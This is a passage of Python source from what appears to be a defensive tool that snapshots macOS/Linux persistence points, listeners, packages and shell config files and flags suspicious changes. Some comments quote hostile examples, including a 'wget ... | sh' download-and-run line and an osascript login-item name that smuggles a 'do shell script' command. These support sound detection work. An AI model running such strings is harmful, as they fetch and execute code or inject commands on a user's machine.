    # mkdir(exist_ok) does NOT tighten a dir that already existed at 0755 (older versions
    # created it loosely) — snapshots contain secrets, so enforce 0700 every time.
    for d in (STATE_DIR, SNAP_DIR):
        try:
            d.chmod(0o700)
        except Exception:
            pass
    base = f"{datetime.fromtimestamp(snap['epoch']):%Y%m%dT%H%M%S}-{snap['epoch']}"
    path = SNAP_DIR / f"{base}.json"
    n = 1
    while path.exists():  # two snapshots in the same second must not clobber each other
        n += 1
        path = SNAP_DIR / f"{base}-{n}.json"
    _write_private(path, json.dumps(snap, indent=1))
    if label:
        labels = load_labels()
        labels[label] = path.name
        _write_private(LABELS_FILE, json.dumps(labels, indent=1))
    prune_snapshots()
    return path


def load_labels() -> dict:
    """{label -> snapshot filename}. Shape-validated for the same reason as safe_load():
    a valid-JSON-but-wrong-type labels.json (`["a","b"]` — an editor mishap, a bad restore)
    otherwise crashed `since mark` with a raw TypeError inside save_snapshot, and
    prune_snapshots with an AttributeError. Non-str entries are dropped, not fatal."""
    try:
        d = json.loads(safe_read_text(LABELS_FILE) or "")
    except Exception:
        return {}
    if not isinstance(d, dict):
        return {}
    return {k: v for k, v in d.items() if isinstance(k, str) and isinstance(v, str)}


def prune_snapshots():
    snaps = list_snapshot_paths()
    # A corrupt labels.json makes load_labels() return {} — which used to mean "nothing is
    # protected", so the next prune DELETED the labelled checkpoints the user asked to keep.
    # If the file exists but yields no labels, decline to prune rather than destroy them.
    if LABELS_FILE.exists() and not load_labels():
        return
    protected = set(load_labels().values())
    prunable = [p for p in snaps if p.name not in protected]
    for p in prunable[:-KEEP_SNAPSHOTS] if len(prunable) > KEEP_SNAPSHOTS else []:
        try:
            p.unlink()
        except Exception:
            pass


# Snapshots are ordered by FILENAME (which we write as <timestamp>-<epoch>[-n].json, so lexical
# order is chronological). Names are therefore validated: the state dir is user-writable, and a
# planted `99999999T999999-9999999999.json` sorted last and simply BECAME the baseline.
_SNAP_NAME_RE = re.compile(r"^\d{8}T\d{6}-\d{9,12}(?:-\d+)?\.json$")


def list_snapshot_paths() -> list[Path]:
    if not SNAP_DIR.is_dir():
        return []
    return sorted(p for p in SNAP_DIR.glob("*.json") if _SNAP_NAME_RE.match(p.name))


def safe_load(path: Path):
    """load_snapshot but returns None on a corrupt/unreadable/wrong-shape file instead
    of raising — one truncated OR stray-but-valid-JSON file (an editor autosave, a
    `cp backup.json`) must not brick every future `since`/`list` run. Validates the
    required snapshot keys so a `{}` doesn't slip through and later KeyError in render."""
    try:
        # safe_read_text, not read_text: a FIFO planted in the snapshots dir (the state dir
        # is user-writable, and safe_load runs over EVERY *.json in it) blocked forever, so
        # every `since` invocation hung — including `list` and the daily digest.
        d = json.loads(safe_read_text(path) or "")
    except Exception:
        return None
    if not (isinstance(d, dict) and isinstance(d.get("created"), str)
            and isinstance(d.get("epoch"), (int, float)) and not isinstance(d.get("epoch"), bool)
            and isinstance(d.get("collectors"), dict)):
        return None
    # Field TYPES, not just presence: `created` reaches datetime.fromisoformat and a blob value
    # reaches .splitlines(), so an int in either raised out of an unisolated path — no snapshot
    # saved, same bad file re-read tomorrow, dead every day (the class this release fixed four
    # times over). A future epoch means a planted or clock-broken file, not a baseline.
    if d["epoch"] > time.time() + 86400:
        return None
    blobs = d.get("blobs")
    if blobs is not None:
        if not isinstance(blobs, dict):
            return None
        d["blobs"] = {k: v for k, v in blobs.items()
                      if isinstance(k, str) and (v is None or isinstance(v, str))}
    return d


# ---------------------------------------------------------------------------
# time parsing & baseline selection
# ---------------------------------------------------------------------------

WEEKDAYS = {d: i for i, d in enumerate(["mon", "tue", "wed", "thu", "fri", "sat", "sun"])}
_UNIT = {"s": 1, "sec": 1, "second": 1, "m": 60, "min": 60, "minute": 60,
         "h": 3600, "hr": 3600, "hour": 3600, "d": 86400, "day": 86400,
         "w": 604800, "week": 604800}

def parse_when(s: str) -> int:
    """Natural-language time -> epoch cutoff (baseline = newest snapshot at/before it)."""
    s = s.strip().lower()
    now = datetime.now()
    if s in ("now",):
        return int(now.timestamp())
    if s == "yesterday":
        return int((now - timedelta(days=1)).timestamp())
    if s == "today":
        return int(now.replace(hour=0, minute=0, second=0, microsecond=0).timestamp())
    m = re.fullmatch(r"(?:last\s+)?([a-z]{3})[a-z]*", s)
    if m and m.group(1) in WEEKDAYS:
        target = WEEKDAYS[m.group(1)]
        back = (now.weekday() - target) % 7 or 7  # most recent *past* occurrence
        day = (now - timedelta(days=back)).replace(hour=0, minute=0, second=0, microsecond=0)
        return int(day.timestamp())
    m = re.fullmatch(r"(?:an?\s+)?(\d*)\s*([a-z]+?)s?(?:\s+ago)?", s)
    if m:
        unit = _UNIT.get(m.group(2))
        if unit:
            n = int(m.group(1)) if m.group(1) else 1
            try:
                return int((now - timedelta(seconds=n * unit)).timestamp())
            except (OverflowError, OSError, ValueError):
                # an absurd window (`99999999d`) overflows datetime — semantically that's
                # "further back than anything we have", so cut off at the epoch (oldest wins)
                # instead of dumping an uncaught traceback.
                return 0
    raise ValueError(f"can't understand time '{s}' (try 1d, 12h, yesterday, monday, '3 hours ago')")


def resolve_baseline(arg: str | None) -> tuple[Path | None, str]:
    """Return (baseline_path, note). arg may be a label or a time expression.
    A note beginning 'error:' means no usable baseline (caller should abort).
    Corrupt snapshots are excluded so a diff never crashes on one."""
    snaps = list_snapshot_paths()
    loadable = [p for p in snaps if safe_load(p) is not None]
    corrupt_note = "" if len(loadable) == len(snaps) else \
        f" ({len(snaps) - len(loadable)} unreadable snapshot(s) skipped)"
    if not loadable:
        return None, ("error: all snapshots are unreadable" if snaps else "")
    if arg:
        labels = load_labels()
        if arg in labels:
            p = SNAP_DIR / labels[arg]
            # Do NOT silently fall back to the newest snapshot — that would diff
            # against ~now and report "nothing changed", a false clean bill.
            if not p.exists() or safe_load(p) is None:
                return None, f"error: checkpoint '{arg}' no longer exists (its snapshot is gone)"
            return p, f"checkpoint '{arg}'"
        cutoff = parse_when(arg)  # may raise ValueError; caller handles
        older = [p for p in loadable if (safe_load(p) or {}).get("epoch", 0) <= cutoff]
        if older:
            return older[-1], corrupt_note.strip() and corrupt_note
        return loadable[0], "(no snapshot that old — using the oldest available)" + corrupt_note
    return loadable[-1], corrupt_note.strip() and corrupt_note


# ---------------------------------------------------------------------------
# big new files + fastest-growing dirs (computed live vs baseline time)
# ---------------------------------------------------------------------------

BIGFILE_PRUNE = {"Library", "node_modules", "DerivedData",
                 "Photos Library.photoslibrary", "Music Library.musiclibrary"}

def find_big_new_files(since_epoch: int, min_mb: int = 25, top: int = 15):
    prune = ["-name", ".?*", "-prune", "-o"]
    for name in BIGFILE_PRUNE:
        prune += ["-name", name, "-prune", "-o"]
    try:
        STATE_DIR.mkdir(parents=True, exist_ok=True, mode=0o700)
        # PID-unique ref file: two concurrent runs must not unlink each other's marker
        # mid-scan (which would silently truncate results to "no big files").
        ref = STATE_DIR / f".bigfile_ref.{os.getpid()}"
        ref.touch()
        os.utime(ref, (since_epoch, since_epoch))
    except Exception:
        return [], [], "big-file scan skipped (couldn't create reference marker)"
    cmd = (["find", str(HOME)] + prune
           + ["-type", "f", "-size", f"+{min_mb}M", "-newer", str(ref), "-print0"])
    # Own subprocess call (not run()) so a timeout / non-zero exit is distinguishable
    # from "no files" — otherwise a slow/large HOME silently reports zero big files.
    note = ""
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=25, errors="replace")
        out = p.stdout
        # macOS find returns non-zero for benign TCC/permission-denied on some dirs —
        # that's expected and not a scan failure. Only surface a note for OTHER errors.
        if p.returncode != 0:
            real = [l for l in p.stderr.splitlines()
                    if l.strip() and "ermission" not in l and "not permitted" not in l.lower()]
            if real and not out:
                note = "big-file scan hit an error — results may be incomplete"
    except subprocess.TimeoutExpired as e:
        # keep what `find` already produced: discarding it turned "most results" into NONE on a
        # large HOME, which reads as "no big new files" — a false all-clear.
        partial = e.stdout or b""
        out = partial.decode("utf-8", "replace") if isinstance(partial, bytes) else (partial or "")
        note = "big-file scan timed out (>25s) — results may be incomplete"
    except Exception:
        out, note = "", "big-file scan failed to run"
    try:
        ref.unlink()
    except Exception:
        pass
    files = []
    state = str(STATE_DIR)
    for path in out.split("\0"):
        # path-PREFIX match, not substring: a plain `in` also excluded a sibling
        # directory whose name merely starts with the state dir's (e.g. `since_backup`).
        if not path or path == state or path.startswith(state + os.sep):
            continue
        try:
            files.append((os.path.getsize(path), tilde(path)))
        except Exception:
            pass
    files.sort(reverse=True)
    # fastest-growing dirs: attribute big new files to their 2-level dir prefix
    by_dir: dict[str, int] = {}
    for size, path in files:
        parts = path.split("/")
        by_dir[("/".join(parts[:3]) if len(parts) > 3 else os.path.dirname(path))] = \
            by_dir.get("/".join(parts[:3]) if len(parts) > 3 else os.path.dirname(path), 0) + size
    growing = sorted(((v, k) for k, v in by_dir.items() if v > 100 * 1024 * 1024), reverse=True)[:5]
    return files[:top], growing, note


# ---------------------------------------------------------------------------
# ignore rules
# ---------------------------------------------------------------------------

def load_ignores() -> list[tuple[str, str]]:
    rules = []
    try:
        for line in (safe_read_text(IGNORE_FILE) or "").splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if ":" in line:
                cat, pat = line.split(":", 1)
                rules.append((cat.strip(), pat.strip()))
            else:
                rules.append(("*", line))
    except Exception:
        pass
    return rules


def is_ignored(category: str, key: str, rules) -> bool:
    for cat, pat in rules:
        if cat not in ("*", category):
            continue
        if pat == "*" or fnmatch.fnmatch(key, pat) or fnmatch.fnmatch(tilde(key), pat):
            return True
    return False


# ---------------------------------------------------------------------------
# diff -> findings (with severity, why, undo, trust)
# ---------------------------------------------------------------------------

def diff_dicts(base: dict, cur: dict):
    b, c = set(base), set(cur)
    return sorted(c - b), sorted(b - c), sorted(k for k in (b & c) if base[k] != cur[k])


# base severity by (class, action)
def base_level(cls: str, action: str) -> int:
    if cls == "persistence":
        return {"added": ORANGE, "changed": YELLOW, "removed": YELLOW}[action]
    if cls == "network":
        return {"added": ORANGE, "changed": ORANGE, "removed": GREEN}[action]
    if cls == "software":
        return {"added": YELLOW, "changed": GREEN, "removed": GREEN}[action]
    return GREEN


def undo_hint(category: str, key: str, value) -> str | None:
    # Every interpolated value is shlex-quoted: `key` can be an attacker-chosen
    # filename/name, and this string is printed for the user to paste into a shell.
    real = key.replace("~", str(HOME), 1) if key.startswith("~") else key
    # cross-platform categories
    # `--` on every hint whose interpolated value could begin with '-': shell-quoting
    # stops the SHELL, not the invoked program's own option parser (see login_items).
    if category == "npm_global":
        return f"npm rm -g -- {q(key)}"
    if category == "pip":
        return f"pip3 uninstall -- {q(key)}"
    if category == "browser_extensions":
        return "remove it from your browser's Extensions page"

    if PLATFORM == "linux":
        if category == "login_items":  # XDG autostart .desktop file
            # the key tells us WHICH dir it came from — a blanket ~/.config path was
            # simply wrong (and a silent no-op) for a /etc/xdg/autostart entry.
            if key.endswith(SYS_AUTOSTART_TAG):
                base = key[:-len(SYS_AUTOSTART_TAG)]
                return f"sudo rm -- {q('/etc/xdg/autostart/' + base)}"
            return f"rm -- {q(str(HOME / '.config/autostart') + '/' + key)}"
        if category == "launch_items":
            if real.startswith("/etc/init.d/"):
                return f"sudo update-rc.d {q(os.path.basename(real))} disable"
            unit = key[5:] if key.startswith("user:") else key
            pre = "systemctl --user" if key.startswith("user:") else "sudo systemctl"
            return f"{pre} disable --now -- {q(unit)}"
        if category == "kernel_extensions":
            return f"sudo modprobe -r {q(key)}   # blacklist in /etc/modprobe.d to persist"
        if category == "brew":  # system package
            base = bare_key(key)   # not a hand-rolled rsplit: that ate a package's own '(...)'
            if key.endswith("(snap)"):
                return f"sudo snap remove -- {q(base)}"
            if key.endswith("(flatpak)"):
                return f"flatpak uninstall -- {q(base)}"
            return f"sudo apt remove -- {q(base)}   # (or dnf/pacman remove)"
        return None

    # macOS
    if category == "launch_items":
        # /Library/LaunchDaemons live in the system domain and are root-owned —
        # the gui/$UID + unprivileged rm hint would silently no-op there.
        if real.startswith("/Library/LaunchDaemons"):
            return f"sudo launchctl bootout system {q(real)} 2>/dev/null; sudo rm -- {q(real)}"
        if real.startswith("/Library/Launch"):
            # /Library/LaunchAgents is root:wheel drwxr-xr-x — unlinking needs write on the
            # DIRECTORY, so the unprivileged rm silently failed and the persistence file
            # survived (it loads in the GUI domain, hence bootout stays gui/$UID).
            return f"launchctl bootout gui/$UID {q(real)} 2>/dev/null; sudo rm -- {q(real)}"
        return f"launchctl bootout gui/$UID {q(real)} 2>/dev/null; rm -- {q(real)}"
    if category == "login_items":
        # The name is passed as an argv PARAMETER so it never enters the AppleScript
        # source, and q() quotes it for the shell. Neither is sufficient on its own:
        # `osascript` parses ITS OWN options out of argv, so a login item named
        # `-e property zz : (do shell script "...")` was consumed as a second -e chunk and
        # its property initializer RAN AT LOAD — the "remove this login item" hint executed
        # the malware author's command instead (verified), while the delete silently
        # no-opped on an empty argv. `--` ends option parsing: the name arrives as data.
        return ("osascript -e 'on run argv' "
                "-e 'tell application \"System Events\" to delete login item (item 1 of argv)' "
                f"-e 'end run' -- {q(key)}")
    if category == "brew":
        # bare_key: the key is `foo (cask)`, and `brew uninstall 'foo (cask)'` names no
        # formula at all — every new cask got a hint that just errored out.
        if key.endswith(" (cask)"):
            return f"brew uninstall --cask {q(bare_key(key))}"
        return f"brew uninstall {q(key)}"
    if category == "kernel_extensions":
        return f"sudo kmutil unload -b {q(key)}   # then reboot"
    if category == "system_extensions":
        return f"remove the owning app, or: systemextensionsctl uninstall <team> {q(key)}"
    return None


# blobs whose presence/content differs by privilege: sudoers is unreadable as a
# normal user; `crontab -l` returns root's vs the user's table. Skipped across a
# privilege mismatch so they don't fabricate add/remove alarms.
def _is_priv_blob(key: str) -> bool:
    return ("/etc/sudoers" in key or key.startswith("crontab")   # sudoers + sudoers.d/*
            or "/etc/cron" in key or "/var/spool/cron" in key     # crontab, cron.d, cron.daily…, spool
            or "/etc/ld.so.preload" in key)


# Categories whose data is defined by an EXTERNAL tool that the user installed, so *which*
# binary answered matters as much as whether one did: /usr/bin/pip3 and /opt/homebrew/bin/pip3
# report different package sets, and the daily job resolves a different PATH than your shell.
# The resolved path is stamped into each snapshot (like euid) and compared before diffing.
def _pkg_tool() -> str:
    """The binary that actually answers for the `brew` CATEGORY on this platform. On Linux that
    category is `_linux_packages` (dpkg-query/rpm/pacman), so stamping `brew` there always
    resolved to "" — which made the whole capability guard a no-op for the most important
    inventory category: no LOST VISIBILITY when the package manager broke, and recovery could
    never fire."""
    if PLATFORM == "macos":
        return "brew"
    for t in ("dpkg-query", "rpm", "pacman"):
        if shutil.which(t):
            return t
    return "dpkg-query"


CAT_TOOLS = {"brew": _pkg_tool(), "npm_global": "npm", "pip": "pip3", "mac_app_store": "mas"}


def _dict(v) -> dict:
    """A dict or an empty one — never trust a field's TYPE in a snapshot we did not just build."""
    return v if isinstance(v, dict) else {}


def tool_identity() -> dict:
    return {cat: (shutil.which(tool) or "") for cat, tool in CAT_TOOLS.items()}


def unusable_cats(baseline: dict, current: dict) -> dict:
    """{category: why} for categories whose collector FAILED in exactly one of the two
    snapshots. Comparing those fabricates mass add/remove — the same trap the privilege
    guard closes for listening/outbound. If it failed in BOTH there is nothing to compare
    either way, so skip silently; a one-sided failure is what the user must be told about."""
    # _dict(): the SAME class of bug this release fixed twice already (labels.json, per-category
    # collector values). unusable_cats is the first code to read the BASELINE's errors/tools, and
    # a wrong type there (hand-edit, bad restore, malware with state-dir write access) raised
    # AttributeError/TypeError out of an unisolated path — killing the digest before it saved a
    # snapshot, so the bad baseline was re-read and it failed identically every day.
    be, ce = _dict(baseline.get("errors")), _dict(current.get("errors"))
    out = {}
    for k in set(be) | set(ce):
        if k in CAT and (k in be) != (k in ce):
            out[k] = ce.get(k) or be.get(k) or "collector failed"
    # Same trap, subtler: the tool RAN in both snapshots but it wasn't the same binary
    # (a shell run finds /opt/homebrew/bin/pip3, the launchd job finds /usr/bin/pip3), so
    # every package looks swapped. Fail CLOSED when either side is unstamped (pre-v0.4.4):
    # we can't confirm they agree, and a fabricated flood can bury a real install.
    bt = _dict(baseline.get("tools")) if isinstance(baseline.get("tools"), dict) else None
    ct = _dict(current.get("tools")) if isinstance(current.get("tools"), dict) else None
    for cat in CAT_TOOLS:
        if cat in out or cat not in CAT:
            continue
        if bt is None or ct is None:
            out[cat] = "baseline predates tool stamping — can't confirm the same tool"
        elif bt.get(cat, "") != ct.get(cat, ""):
            out[cat] = (f"a different tool answered: {bt.get(cat) or '(none)'} "
                        f"vs {ct.get(cat) or '(none)'}")
    return out


def _flag_counts(snap: dict, key: str) -> dict:
    """{pattern description: count} for one blob, tolerating every legacy/wrong shape: v0.4.4
    stored a list, and a hostile or corrupt snapshot can store anything at all."""
    v = _dict(snap.get("blob_flags")).get(key)
    if isinstance(v, dict):
        return {k: n for k, n in v.items() if isinstance(k, str) and isinstance(n, int)}
    if isinstance(v, (list, tuple, set)):
        return {d: 1 for d in v if isinstance(d, str)}
    return {}


def coverage_lost(baseline: dict, current: dict, unusable: dict) -> dict:
    """{category: reason} for the subset of `unusable` that means we USED to see a category and
    now cannot. Skipping a category is the right call (comparing fabricates mass add/remove) —
    but silently skipping it is not: losing visibility is itself a security event, and an
    attacker who breaks `brew` would otherwise buy silence for their own install. A first run,
    or a baseline predating tool stamping, is NOT a loss — that's benign and gets a note only."""
    bt = _dict(baseline.get("tools"))
    ct = _dict(current.get("tools")) if isinstance(current.get("tools"), dict) else None
    be, ce = _dict(baseline.get("errors")), _dict(current.get("errors"))
    lost = {}
    for cat, why in unusable.items():
        stamped = cat in CAT_TOOLS
        # A category is "lost" if the baseline could see it and we cannot now. For the four
        # tool-stamped categories that needs the stamp; for the other nine — listening, login
        # items, DNS/proxy, kexts, system extensions, launch items… — the ERROR alone is the
        # signal, and requiring a stamp meant a broken `lsof`/`osascript`/`scutil` produced only
        # a passive note. Those are the loudest categories in the tool; silence there is worse.
        had_it = (cat not in be) and (bool(bt.get(cat)) if stamped else True)
        if not had_it or (stamped and ct is None):
            continue          # first run, absent in both, or the pre-stamp transition: benign
        gone = cat in ce or (stamped and not ct.get(cat))
        # A tool that merely CHANGED is equally a loss of comparability, and equally abusable:
        # the daily job's pinned PATH necessarily includes user-writable dirs, so planting
        # ~/.local/bin/brew swaps the identity WITHOUT erroring — and a passive note bought the
        # attacker silence for their own package. Rare enough in normal use (a Homebrew
        # reinstall, a python upgrade) to be worth one look when it happens.
        swapped = stamped and bool(ct.get(cat)) and ct.get(cat) != bt.get(cat)
        if gone or swapped:
            lost[cat] = why
    return lost


def cat_usable(cat: str, snap: dict) -> bool:
    """Could `snap` actually SEE this category? (no collector error, and its tool resolved)"""
    if cat in _dict(snap.get("errors")):
        return False
    if cat in CAT_TOOLS and not _dict(snap.get("tools")).get(cat):
        return False
    return True


def recover_baselines(current: dict, unusable, baseline: dict | None = None) -> dict:
    """{category: older_snapshot} for each skipped category we can see NOW — the newest earlier
    snapshot that could see it with the SAME tool.

    Without this a skipped category silently vanishes: the blind snapshot still becomes
    tomorrow's baseline, so a package installed during the blind window is never reported by any
    run, ever, while the report says "Nothing changed". Walking back recovers it as soon as the
    collector works again."""
    out = {}
    cutoff = (baseline or {}).get("epoch")
    for cat in sorted(unusable):
        if not cat_usable(cat, current):
            continue                     # still blind now: nothing to compare against
        # ONLY durable inventory. "What is installed" survives a week; "what is listening" does
        # not — recovering an ephemeral category against a days-old snapshot FABRICATED 27
        # ORANGE add/remove findings and fired the notification, i.e. it re-opened the exact
        # phantom flood the capability guard exists to prevent.
        if CAT[cat]["cls"] != "software" or cat in PRIV_SENSITIVE_CATS:
            continue
        want = _dict(current.get("tools")).get(cat)
        for path in reversed(list_snapshot_paths()):
            older = safe_load(path)
            if not older or not cat_usable(cat, older):
                continue
            # Never compare across privilege levels — recovery bypassed the euid guard entirely,
            # including the unstamped case the main guard deliberately fails closed on.
            if older.get("root") is None or older.get("root") != current.get("root"):
                continue
            # …and never reach FORWARD of the baseline: with `--since 8d` (or a checkpoint) the
            # newest usable snapshot can be newer than the requested baseline, which both hid a
            # change inside the window and claimed a comparison it had not made.
            if cutoff is not None and (older.get("epoch") or 0) > cutoff:
                continue
            if _dict(older.get("tools")).get(cat) == want:
                out[cat] = older
                break
    return out


def build_findings(baseline: dict, current: dict, include_quiet=False, skip_cats=(),
                   skip_priv_blobs=False, coverage: dict | None = None,
                   skip_blobs=False) -> list[dict]:
    rules = load_ignores()
    findings: list[dict] = []
    for key, meta in CAT.items():
        if key in skip_cats:
            continue
        if meta["tier"] == "quiet" and not include_quiet:
            continue
        base = baseline.get("collectors", {}).get(key, {})
        cur = current.get("collectors", {}).get(key, {})
        # safe_load validates that `collectors` is a dict but not its VALUES: a snapshot
        # holding `{"brew": ["x"]}` (hand-edited, half-written, restored from junk) passed
        # validation and then raised TypeError here, killing the whole report.
        if not isinstance(base, dict) or not isinstance(cur, dict):
            continue
        added, removed, changed = diff_dicts(base, cur)
        for action, items in (("added", {k: cur[k] for k in added}),
                              ("removed", {k: base[k] for k in removed}),
                              ("changed", {k: (base[k], cur[k]) for k in changed})):
            for k, v in items.items():
                if is_ignored(key, k, rules):
                    continue
                # quiet-tier categories (outbound) are informational only — never
                # let them reach the ranked "worth a look" section or fire a notify.
                level = GREEN if meta["tier"] == "quiet" else base_level(meta["cls"], action)
                extra = {}
                if key == "listening" and action == "changed":
                    # A daemon that rebinds ALL its ports each boot (rapportd) shares
                    # none with the baseline → benign churn, skip. But a process that
                    # KEEPS a port and gains OR loses another is a real signal: a new
                    # port is backdoor-shaped (ORANGE), a dropped port means a service
                    # stopped listening (YELLOW). Previously BOTH were dropped entirely.
                    old_ports = set(str(v[0]).split(","))
                    new_ports = set(str(v[1]).split(","))
                    added_ports = sorted(new_ports - old_ports)
                    removed_ports = sorted(old_ports - new_ports)
                    if not (added_ports or removed_ports):
                        continue                       # nothing actually changed
                    # Churn suppression must be NARROW. "no overlap => churn" dropped a
                    # single-port service rebinding (8080 -> 4444) and a backdoor sharing a
                    # churny process name (rapportd 49152 -> 49157,4444) — both silently, in the
                    # highest-signal category. Only a multi-port set that is ENTIRELY ephemeral
                    # is churn; anything with a well-known port is reported.
                    ephemeral = all(pt.isdigit() and int(pt) >= 32768
                                    for pt in (old_ports | new_ports) if pt)
                    if not (old_ports & new_ports) and ephemeral and len(old_ports) > 1:
                        continue
                    level = ORANGE if added_ports else YELLOW
                    if added_ports:
                        extra["added_ports"] = added_ports
                    if removed_ports:
                        extra["removed_ports"] = removed_ports
                f = {"category": key, "label": meta["label"], "cls": meta["cls"],
                     "action": action, "key": k, "value": v,
                     "level": level, "trust": None, "why": None, "undo": None, **extra}
                # Enrichment (trust check, attribution, undo hint) parses ATTACKER-WRITTEN
                # files at diff time. Collectors are all failure-isolated; this path was not,
                # and `main` catches only KeyboardInterrupt — so one malformed plist killed
                # the entire digest, saved no snapshot, and therefore recurred every day.
                # Degrade ONE finding instead of the report; the finding itself still shows.
                try:
                    _enrich(f, current)
                except Exception as e:
                    f["trust"] = f"enrichment failed ({type(e).__name__})"
                findings.append(f)
    # text blobs (system files)
    bb, bc = ({}, {}) if skip_blobs else (baseline.get("blobs", {}), current.get("blobs", {}))
    for key in sorted(set(bb) | set(bc)):
        ob, oc = bb.get(key), bc.get(key)
        if ob == oc:
            continue
        if is_ignored("config", key, rules):
            continue
        if skip_priv_blobs and _is_priv_blob(key):
            continue
        status = "added" if ob is None else "removed" if oc is None else "changed"
        # difflib is O(n^2) on adversarial input: ~100 distinct repeated lines defeat its
        # autojunk heuristic, so a planted 0.74MB ~/.zshrc took 32s of a real digest run
        # (MAX_READ bounds the READ at 8MB; nothing bounded the DIFF). Above the cap report
        # the change WITHOUT a line diff — same key, same severity, just no line detail.
        ob_l, oc_l = (ob or "").splitlines(), (oc or "").splitlines()
        if (max(len(ob_l), len(oc_l)) > DIFF_MAX_LINES
                or max(len(ob or ""), len(oc or "")) > DIFF_MAX_BYTES):
            udiff = [f"+ (file too large to diff line-by-line: "
                     f"{len(oc_l)} lines, {human_size(len(oc or ''))}; "
                     f"content hash {sha(oc or '')})"]
        else:
            udiff = list(difflib.unified_diff(ob_l, oc_l, lineterm="", n=0))[2:]
        # `added` is ORANGE too: creating a file that did not exist is not milder than editing
        # one. `~/.zshenv` is sourced by EVERY zsh invocation, and at YELLOW it never crossed the
        # --notify threshold — so the cheaper attack was also the quieter one.
        level = ORANGE if status in ("changed", "added") else YELLOW
        if any(s in key for s in SENSITIVE_TEXT):
            level = max(level, ORANGE)
        why = None
        added_text = "\n".join(l[1:] for l in udiff if l.startswith("+"))
        for pat, desc in MALICIOUS_PATTERNS:
            if pat.search(added_text):
                level, why = RED, desc
                break
        # …and independently of the diff text: a flag that is NEW in this snapshot escalates even
        # when the payload sits past BLOB_MAX or the line diff was skipped for size (see
        # text_sources). Flags are computed over the whole file at snapshot time.
        if why is None:
            # _flag_counts: `_dict()` guarded the outer dict but not the VALUE, so a scalar
            # there (`{"~/.zshrc": 5}`) raised TypeError out of an unisolated path — no snapshot
            # saved, same poisoned baseline re-read tomorrow, dead every day. Third instance of
            # this class in one release; validate the shape of everything a snapshot hands back.
            cur_f, base_f = _flag_counts(current, key), _flag_counts(baseline, key)
            # COUNTS, not set membership: flags are pattern descriptions, so one benign
            # `# … wget https://x/get.sh | sh (do not run)` comment planted in the baseline
            # marked that description present forever and suppressed every later real payload
            # sharing it. An increase is what matters.
            worse = [d for d, n in cur_f.items() if n > base_f.get(d, 0)]
            if worse:
                level, why = RED, sorted(worse)[0]
        findings.append({"category": "config", "label": "System files", "cls": "config",
                         "action": status, "key": key, "value": None, "level": level,
                         "trust": None, "why": why, "undo": None, "diff": udiff})
    # Losing a whole category is ranked, not whispered — so it reaches "worth a look" and can
    # fire --notify, instead of an attacker gaining silence by breaking the collector's tool.
    for cat, why in sorted((coverage or {}).items()):
        findings.append({"category": "coverage", "label": "Monitoring coverage",
                         "cls": "config", "action": "changed", "key": CAT[cat]["label"],
                         "value": None, "level": ORANGE, "trust": None,
                         "why": f"no longer visible: {why}", "undo": None})
    findings.sort(key=lambda f: (-f["level"], f["category"], f["key"]))
    return findings


def _enrich(f: dict, current: dict):
    cat, action, key = f["category"], f["action"], f["key"]
    # signing/trust for new persistence programs & apps
    # persistence: check "changed" too — overwriting an EXISTING plist is the classic hijack,
    # and it previously got only a YELLOW content-hash line with no trust check and no notify.
    if action in ("added", "changed") and cat == "launch_items":
        prog, argv = plist_program_and_argv(key)
        if prog:
            label, suspicious = trust_of(prog)
            base = os.path.basename(prog)
            if base in _INTERPRETERS or base.startswith("python"):
                note = (f"runs via {base} — an interpreter, so its signature says nothing "
                        "about what it executes")
                # APPEND, never clear `suspicious`: the basename is attacker-chosen, so
                # `cp miner ~/Library/.../sh` used to drop an UNSIGNED binary from RED to YELLOW
                # and silence --notify, while the trust line read as a reassuring explanation.
                label = note if not suspicious else f"{label} — {note}"
            f["trust"] = label
            if suspicious:
                f["level"] = RED
        if argv:
            # malicious_hits, not a raw pattern loop: it brings the chunked scan and the
            # required-literal pre-filter, so the WHOLE argv is scanned cheaply instead of only
            # its first bytes — padding argv[0] past the old cap evaded the scan entirely.
            hits = malicious_hits(argv)
            if hits:
                f["level"], f["why"] = RED, sorted(hits)[0]
        if action == "changed":
            f["level"] = max(f["level"], ORANGE)
    if action == "added":
        prog = None
        if cat == "applications":
            # the collector stores the real bundle path in the value; reconstruct only for a
            # pre-v0.4.6 snapshot whose value is still just the containing directory.
            val = f["value"] if isinstance(f["value"], str) else ""
            prog = val if val.endswith(".app") else f"{val}/{bare_key(key)}.app"
        if prog:
            label, suspicious = trust_of(prog)
            f["trust"] = label
            if suspicious:
                f["level"] = RED
    # attribution for software installs
    if cat in ("brew", "npm_global", "pip", "applications", "mac_app_store") and action == "added":
        # bare_key: a tagged key (`foo (cask)`, `foo (snap)`) can never whole-word-match
        # a history line, so casks/snaps/flatpaks silently got no "why" at all.
        f["why"] = attribution_for(bare_key(key))
    # undo hints for anything reversible we added
    if action == "added":
        f["undo"] = undo_hint(cat, key, f["value"])


# ---------------------------------------------------------------------------
# rendering
# ---------------------------------------------------------------------------

C = {"reset": "\033[0m", "dim": "\033[2m", "bold": "\033[1m",
     "red": "\033[1;31m", "orange": "\033[38;5;208m", "yellow": "\033[33m",
     "green": "\033[32m", "cyan": "\033[36m"}
LEVEL_COLOR = {RED: "red", ORANGE: "orange", YELLOW: "yellow", GREEN: "green"}
LEVEL_DOT = {RED: "🔴", ORANGE: "🟠", YELLOW: "🟡", GREEN: "⚪"}

def _color() -> bool:
    return sys.stdout.isatty() and os.environ.get("NO_COLOR") is None

def paint(s, key):
    return f"{C[key]}{s}{C['reset']}" if _color() else s


def _describe(f: dict) -> str:
    # every interpolated field is clean()'d — key/value can be an attacker-chosen
    # name carrying terminal escapes meant to hide or spoof this very line.
    cat, action = f["category"], f["action"]
    key, val = clean(f["key"]), f["value"]
    verb = {"added": "NEW", "removed": "removed", "changed": "changed"}[action]
    if cat == "listening" and action == "added":
        return f"{verb} listener: {paint(key, 'bold')} on port(s) {clean(val)}"
    if cat == "listening" and action == "changed":
        bits = []
        if f.get("added_ports"):
            bits.append("now ALSO on port(s) " + clean(", ".join(f["added_ports"])))
        if f.get("removed_ports"):
            bits.append("stopped listening on port(s) " + clean(", ".join(f["removed_ports"])))
        return f"listener {paint(key, 'bold')} " + "; ".join(bits)
    if cat == "coverage":
        return f"LOST VISIBILITY: {paint(key, 'bold')} is no longer being monitored"
    if cat == "config":
        tag = {"added": "NEW FILE", "removed": "gone", "changed": "edited"}[action]
        return f"{key} ({tag})"
    if action == "changed" and isinstance(val, tuple):
        return (f"{verb} {f['label'].lower()}: {clean(tilde(f['key']))} "
